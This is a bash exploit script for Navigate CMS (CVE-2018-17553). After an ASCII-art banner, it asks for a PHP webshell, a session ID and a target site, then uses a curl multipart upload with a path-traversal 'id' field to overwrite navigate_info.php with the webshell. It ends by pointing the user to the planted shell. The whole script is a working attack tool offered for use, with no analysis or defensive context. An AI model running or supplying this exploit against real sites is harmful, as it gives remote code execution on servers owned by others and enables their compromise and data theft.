#!/bin/bash

clear                                                  

echo ""
echo "                                       .ckk;       "
echo "               .cc,                   .xWMMk.      "
echo "              .dMMNx.                 ,KMMNc       "
echo "               :XMMMd                 :XWO,        "
echo "                'dKMXc               '0M0'         "
echo "                  .kWNo. .',:lodxxxdoOWWo.         "
echo "                   .oNW0OXNWMMMMMMMMMMMWXOo;.      "
echo "                   ,xNMMMMMMMMMWNNNWMMMMMMMWKd,    "
echo "                 ,xNMMMMMMMNOl:,'.cKMKolx0NMMMNx'  "
echo "               .lXMMMMW00NMWx...';kWNl   .,l0WMMK: "
echo "  .,:c;'      .dNMMMW0:..l0NWXKXNWMMW0o,    .:do;. "
echo " .oNMMMNOoc:,'dNMMMNd.  'xKNWKxl:::cdONWO,         "
echo "  .lOKK000XNNNWMMMMKl,':0MMKl.        ,oo'         "
echo "     ... ..';kWMMMNXNNNWMKx;                       "
echo "             oMMMNc.',dNMd.      Navigate CMS      "
echo "             lWMM0,   '0Mx'.    CVE-2018-17553     "
echo "             ,KMMK,    cx;.                        "
echo "              oWMWl                                "
echo "              .oxc.                                "
echo ""
echo ""

echo "Where is your PHP webshell?"
echo ""
read exploit
echo ""
echo "What is your session ID?"
echo ""
read session
echo ""
echo "What is the site you're you're attacking?"
echo ""
read site
echo ""
cp $exploit ./exploit.jpg
echo ""
curl -X POST -H "Content-type:multipart/form-data" -F "name=exploit.jpg" -F "session_id=$session" -F "engine=picnik" -F "id=../../../navigate_info.php" -F "file=@exploit.jpg" $site/navigate/navigate_upload.php

rm ./exploit.jpg

echo "Browse to $site/navigate/navigate_info.php to access your webshell."
